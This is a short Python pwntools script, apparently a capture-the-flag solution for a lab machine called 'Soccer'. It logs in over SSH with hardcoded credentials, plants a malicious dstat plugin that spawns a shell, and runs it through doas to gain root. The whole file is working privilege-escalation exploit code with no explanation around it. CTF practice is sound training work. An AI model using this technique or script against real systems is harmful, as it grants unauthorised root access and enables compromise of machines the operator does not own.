import requests



try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Soccer - Ninhpn1337\n")
except:
    print("\n[\033[1;31m!\033[1;37m] Sudo please!\n")
    exit(1)
request = ssh(host="10.10.11.194", user="player", password="PlayerOftheMatch2022")
shell = request.process("/bin/sh")
time.sleep(0.5)
shell.sendline(b"sh")
time.sleep(0.5)
shell.sendline(b"cd /usr/local/share/dstat")
time.sleep(0.5)
shell.sendline(b"echo 'import os' > file.txt")
time.sleep(0.5)
shell.sendline(b"echo 'os.system(\"sh\")' >> file.txt")
time.sleep(0.5)
shell.sendline(b"mv file.txt dstat_ninhpn1337.py")
time.sleep(0.5)
shell.sendline(b"doas /usr/bin/dstat --ninhpn1337")
time.sleep(0.5)
shell.sendline(b"whoami")
shell.interactive()
